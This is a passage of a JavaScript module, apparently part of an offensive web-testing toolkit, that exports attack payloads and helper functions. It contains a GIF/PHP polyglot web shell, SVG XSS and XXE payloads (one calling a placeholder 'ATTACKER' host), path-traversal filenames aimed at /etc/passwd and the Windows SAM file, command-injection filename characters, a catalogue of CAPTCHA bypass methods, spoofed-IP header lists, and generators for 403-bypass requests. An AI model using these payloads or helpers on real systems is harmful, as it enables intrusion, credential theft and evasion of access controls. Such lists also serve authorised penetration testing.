    exe: { hex: '4D 5A', bytes: [0x4D, 0x5A], string: 'MZ' },
    elf: { hex: '7F 45 4C 46', bytes: [0x7F, 0x45, 0x4C, 0x46] },
    mp3: { hex: '49 44 33', bytes: [0x49, 0x44, 0x33] },
    mp4: { hex: '66 74 79 70', bytes: [0x66, 0x74, 0x79, 0x70] },
    webp: { hex: '52 49 46 46', bytes: [0x52, 0x49, 0x46, 0x46] },
    svg: { string: '<?xml', payload: '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"></svg>' },
  },
  
  // Polyglot Files (valid as multiple file types)
  polyglots: [
    {
      name: 'GIF + PHP',
      description: 'File that is both valid GIF and PHP',
      content: 'GIF89a;<?php system($_GET["cmd"]); ?>',
    },
    {
      name: 'JPEG + PHP',
      description: 'PHP code in JPEG EXIF comment',
      technique: 'Inject PHP in EXIF Comment field using exiftool',
    },
    {
      name: 'PNG + PHP',
      description: 'PHP code in PNG IDAT chunk',
      technique: 'Use tools to inject PHP in PNG metadata chunks',
    },
    {
      name: 'SVG + XSS',
      description: 'SVG with embedded JavaScript',
      content: '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>',
    },
    {
      name: 'SVG + SSRF',
      description: 'SVG with external entity for SSRF',
      content: '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://ATTACKER/ssrf">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>',
    },
    {
      name: 'PDF + JavaScript',
      description: 'PDF with embedded JavaScript',
      technique: 'Use pdf-parser to inject JS in PDF objects',
    },
  ],
  
  // Filename manipulation
  filename_tricks: [
    // Path traversal in filename
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    
    // Overwrite existing files
    '../index.php',
    '../.htaccess',
    '../web.config',
    '../wp-config.php',
    
    // Long filename
    'A'.repeat(255) + '.php',
    'A'.repeat(500) + '.php',
    
    // Special characters in filename
    'shell;.php', 'shell&.php', 'shell|.php',
    'shell`.php', "shell'.php", 'shell".php',
    'shell$.php', 'shell(.php', 'shell).php',
    'shell{.php', 'shell}.php', 'shell[.php', 'shell].php',
    
    // Unicode/special filenames
    'shell\u202ephp.jpg',  // Right-to-left override
    'shell%E2%80%AEphp.jpg',  // URL-encoded RTLO
  ],
  
  // Multipart form-data manipulation
  multipart_tricks: [
    'Multiple filename fields in same part',
    'filename vs filename* (RFC 5987)',
    'Duplicate Content-Disposition headers',
    'Mixed boundary manipulation',
    'Oversized Content-Length',
    'Chunked transfer encoding',
    'Remove Content-Type from multipart',
    'Add extra whitespace in headers',
    'Use CRLF vs LF in multipart boundaries',
    'Nested multipart boundaries',
  ],
};

/**
 * CAPTCHA_BYPASS - 20+ techniques for bypassing CAPTCHA
 */
export const CAPTCHA_BYPASS = [
  {
    technique: 'Remove CAPTCHA parameter',
    description: 'Simply remove the captcha field from the request',
  },
  {
    technique: 'Empty CAPTCHA value',
    description: 'Send empty string for captcha parameter',
  },
  {
    technique: 'Reuse old CAPTCHA token',
    description: 'Reuse a previously valid captcha response',
  },
  {
    technique: 'Change request method',
    description: 'Switch from POST to GET or PUT - captcha may not be validated',
  },
  {
    technique: 'Remove Referer header',
    description: 'Some captcha validations check Referer',
  },
  {
    technique: 'Use API endpoint directly',
    description: 'Call the backend API directly bypassing the frontend captcha',
  },
  {
    technique: 'JSON content type',
    description: 'Switch to application/json - captcha validation may only apply to form submissions',
  },
  {
    technique: 'Custom header bypass',
    description: 'Add X-Requested-With: XMLHttpRequest to skip captcha for AJAX requests',
  },
  {
    technique: 'Mobile User-Agent',
    description: 'Use mobile User-Agent - mobile endpoints may not require captcha',
  },
  {
    technique: 'Bot User-Agent (Googlebot)',
    description: 'Use Googlebot User-Agent - some sites whitelist search engine bots',
  },
  {
    technique: 'Rate limit the captcha itself',
    description: 'Some captchas have their own rate limits that can be exploited',
  },
  {
    technique: 'OCR automation',
    description: 'Use Tesseract OCR or similar for simple text captchas',
  },
  {
    technique: 'Audio captcha',
    description: 'Request audio version and use speech-to-text',
  },
  {
    technique: 'Session manipulation',
    description: 'Create new session after captcha is solved, reuse the solved state',
  },
  {
    technique: 'Parameter tampering',
    description: 'Change captcha_required=true to captcha_required=false',
  },
  {
    technique: 'JavaScript disabled',
    description: 'Some JS-based captchas fail open when JS is disabled',
  },
  {
    technique: 'Null byte in captcha field',
    description: 'Send %00 or null as captcha value',
  },
  {
    technique: 'Array notation',
    description: 'Send captcha[]=value or captcha[] to confuse validation',
  },
  {
    technique: 'Timing attack',
    description: 'Submit before captcha fully loads - validation may not be ready',
  },
  {
    technique: 'Third-party solving services',
    description: 'Use 2captcha, anti-captcha, or similar services for automation',
  },
  {
    technique: 'Browser automation with stealth',
    description: 'Use puppeteer-extra-plugin-stealth or undetected-chromedriver',
  },
  {
    technique: 'Cookie manipulation',
    description: 'Copy cookies from a session where captcha was already solved',
  },
  {
    technique: 'Invisible reCAPTCHA score manipulation',
    description: 'Manipulate browser fingerprint to get high trust score',
  },
  {
    technique: 'Enterprise captcha token reuse',
    description: 'Some enterprise captcha tokens are valid for multiple uses',
  },
];

/**
 * IP_ROTATION_HEADERS - All headers that can be used to rotate apparent IP
 */
export const IP_ROTATION_HEADERS = [
  // Standard Proxy Headers
  'X-Forwarded-For',
  'X-Real-IP',
  'X-Client-IP',
  'X-Remote-IP',
  'X-Remote-Addr',
  'X-Originating-IP',
  'X-Cluster-Client-IP',
  'X-Original-Forwarded-For',
  
  // Cloud Provider Headers
  'CF-Connecting-IP',           // Cloudflare
  'Fastly-Client-IP',          // Fastly
  'X-Azure-ClientIP',          // Azure
  'X-Azure-SocketIP',          // Azure
  'X-Appengine-User-IP',      // Google App Engine
  'X-Google-Real-IP',          // Google
  'Akamai-Client-IP',          // Akamai
  'X-Akamai-Client-IP',       // Akamai
  'X-Sucuri-ClientIP',        // Sucuri
  'X-Incap-Client-IP',        // Imperva/Incapsula
  'X-AWS-Real-IP',            // AWS
  'X-Vercel-Forwarded-For',   // Vercel
  'X-Netlify-IP',             // Netlify
  
  // Load Balancer Headers
  'True-Client-IP',
  'Proxy-Client-IP',
  'WL-Proxy-Client-IP',       // WebLogic
  'HTTP_X_FORWARDED_FOR',
  'HTTP_X_FORWARDED',
  'HTTP_CLIENT_IP',
  'HTTP_FORWARDED_FOR',
  'HTTP_FORWARDED',
  'HTTP_VIA',
  'REMOTE_ADDR',
  
  // Forwarded (RFC 7239)
  'Forwarded',                  // for=IP;by=proxy;host=host;proto=https
  'Forwarded-For',
  'X-Forwarded',
  
  // Custom/Non-standard
  'X-ProxyUser-Ip',
  'X-Custom-IP-Authorization',
  'X-Backend-IP',
  'X-Proxy-IP',
  'X-Original-Remote-Addr',
  'X-Connecting-IP',
  'X-Real-Client-IP',
  'X-True-Client-IP',
  'X-Forwarded-For-Original',
  'X-Source-IP',
  'X-Upstream-IP',
  'X-Edge-IP',
  'X-CDN-IP',
  'X-Request-IP',
  'Client-IP',
  'Real-IP',
  'Remote-Addr',
  'Via',
];

/**
 * Helper: Generate random internal IP for header rotation
 */
export function generateRandomIP() {
  const ranges = [
    () => `10.${rand(255)}.${rand(255)}.${rand(255)}`,
    () => `172.${rand(16, 31)}.${rand(255)}.${rand(255)}`,
    () => `192.168.${rand(255)}.${rand(255)}`,
    () => `${rand(1, 223)}.${rand(255)}.${rand(255)}.${rand(255)}`,
  ];
  return ranges[Math.floor(Math.random() * ranges.length)]();
}

function rand(max, min = 0) {
  if (typeof max === 'number' && typeof min === 'number' && min > 0) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  return Math.floor(Math.random() * (max + 1));
}

/**
 * Helper: Generate all bypass headers with a random IP
 */
export function generateIPRotationHeaders() {
  const ip = generateRandomIP();
  const headers = {};
  IP_ROTATION_HEADERS.forEach(h => {
    if (h === 'Forwarded') {
      headers[h] = `for=${ip}`;
    } else {
      headers[h] = ip;
    }
  });
  return headers;
}

/**
 * Helper: Generate 403 bypass requests for a given path
 */
export function generate403Bypasses(basePath) {
  const requests = [];
  
  // Path-based bypasses
  ADMIN_PATH_BYPASS.forEach(pathPayload => {
    const modifiedPath = pathPayload.replace('/admin', basePath);
    requests.push({ path: modifiedPath, method: 'GET', headers: {} });
  });
  
  // Header-based bypasses
  FORBIDDEN_403_BYPASS.filter(b => b.header).forEach(bypass => {
    const value = bypass.value.replace('TARGET', 'target.com');
    requests.push({
      path: basePath,
      method: 'GET',
      headers: { [bypass.header]: value },
    });
  });
  
  // Method-based bypasses
  FORBIDDEN_403_BYPASS.filter(b => b.method).forEach(bypass => {
    requests.push({
      path: basePath,
      method: bypass.method,
      headers: {},
    });
  });
  
  return requests;
}

export default {
  ADMIN_PATH_BYPASS,
  FORBIDDEN_403_BYPASS,
  HEADER_BYPASS,
  WAF_BYPASS_ENCODINGS,
  RATE_LIMIT_BYPASS,
  AUTH_BYPASS_HEADERS,
  HTTP_METHOD_BYPASS,
  FILE_UPLOAD_BYPASS,
  CAPTCHA_BYPASS,
  IP_ROTATION_HEADERS,
  generateRandomIP,
  generateIPRotationHeaders,
  generate403Bypasses,
};
